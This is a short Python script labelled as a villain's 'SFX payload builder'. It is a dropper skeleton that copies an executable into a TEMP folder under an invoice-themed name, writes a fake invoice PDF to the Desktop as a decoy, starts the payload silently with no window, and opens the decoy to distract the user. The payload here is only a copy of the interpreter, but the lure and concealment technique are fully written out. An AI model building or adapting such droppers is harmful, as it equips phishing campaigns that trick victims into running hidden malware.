# VILLAIN: CyberRecon SFX payload builder
import os, shutil, subprocess, sys
from pathlib import Path

def build_sfx():
    tmp = Path(os.environ["TEMP"]) / "Invoice_2024"
    tmp.mkdir(exist_ok=True)
    payload = tmp / "invoice_2024.exe"
    shutil.copy2(sys.executable, payload)

    desktop = Path.home() / "Desktop"
    decoy = desktop / "Invoice_2024.pdf"
    decoy.write_bytes(b"%PDF-1.4 fake invoice")

    subprocess.Popen([str(payload)], creationflags=subprocess.CREATE_NO_WINDOW)
    os.startfile(decoy)
